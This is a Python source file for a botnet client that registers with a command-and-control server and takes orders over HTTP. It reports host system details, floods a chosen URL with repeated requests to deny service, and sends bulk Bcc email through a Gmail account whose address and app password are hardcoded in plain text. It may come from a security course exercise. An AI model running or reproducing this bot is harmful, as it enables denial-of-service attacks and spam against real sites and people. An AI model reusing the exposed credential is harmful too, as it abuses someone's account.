import atexit
import contextlib
import platform
import smtplib
import threading
import requests
import socket
import json

from http.server import BaseHTTPRequestHandler, HTTPServer
from email.mime.text import MIMEText


class Bot(BaseHTTPRequestHandler):
    status = {'action': 'Idle', 'targets': []}  # TODO list of actions
    lock = threading.Lock()
    stop = threading.Event()
    smtp_server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    user = "botnetsicurezza@gmail.com"
    password = "cebqshlncuewhjso"

    def __response_body(self, func):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(bytes(json.dumps(func()), "utf-8"))

    def do_GET(self):
        if self.path == '/info':
            self.__response_body(self.__info)

        elif self.path == '/status':
            self.__response_body(self.__status)

        elif self.path == '/stop':
            if self.status['action'] == 'Idle':
                self.send_response(406)
            else:
                self.send_response(200)
            self.end_headers()
            self.stop.set()

        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/start':
            self.__start_attack()
        elif self.path == '/email':
            self.__start_email()
        else:
            self.send_response(404)

        self.end_headers()

    def __start_email(self):
        length = int(self.headers['Content-Length'])
        payload = json.loads(self.rfile.read(length).decode('utf-8'))

        emailing = threading.Thread(target=Bot.__email, args=(self, payload['emails'], payload['subj'], payload['txt']))
        emailing.start()
        self.send_response(200)

    def __start_attack(self):
        length = int(self.headers['Content-Length'])
        payload = json.loads(self.rfile.read(length).decode('utf-8'))

        url = payload['url']

        try:
            res = requests.get(url)
            if res.status_code != 200:
                self.send_response(400)
                return
        except Exception:
            self.send_response(400)
            return

        self.stop.clear()

        attack = threading.Thread(target=Bot.__attack, args=(self, url))
        attack.start()
        self.send_response(200)

    def __info(self):
        info = platform.uname()._asdict()
        info['processor'] = platform.processor()
        return info

    def __status(self):
        with self.lock:
            return self.status

    def __attack(self, url):
        with self.lock:
            self.status['action'] = "Attacking"
            self.status['targets'].append(url)

        while not self.stop.is_set():
            print(f"Request sent to {url}, status code:{requests.get(url).status_code}")

        with self.lock:
            self.status['action'] = "Idle"
            self.status['targets'].clear()

    def __email(self, emails, subj, text):
        with self.lock:
            user = self.user
            self.smtp_server.login(user, self.password)

        message = MIMEText(text)
        message['Subject'] = subj
        message['From'] = user
        message['Bcc'] = ', '.join(emails)

        with self.lock:
            self.smtp_server.send_message(message)
            self.smtp_server.quit()


CNC_ADDR = '127.0.0.1'  # "10.0.2.15"
CNC_PORT = 60000


def connect(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((CNC_ADDR, CNC_PORT))
        s.send(str(port).encode('utf-8'))


def disconnect():
    with contextlib.suppress(ConnectionRefusedError):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((CNC_ADDR, CNC_PORT))


if __name__ == '__main__':
    bot = HTTPServer(('', 0), Bot)

    try:
        connect(bot.server_port)
        print("Connected to the Command & Control")
        atexit.register(disconnect)
        bot.serve_forever()
    except ConnectionRefusedError as e:
        print("Cannot establish the connection to Command & Control")
    except KeyboardInterrupt as e:
        pass
    finally:
        print("Closing program...")
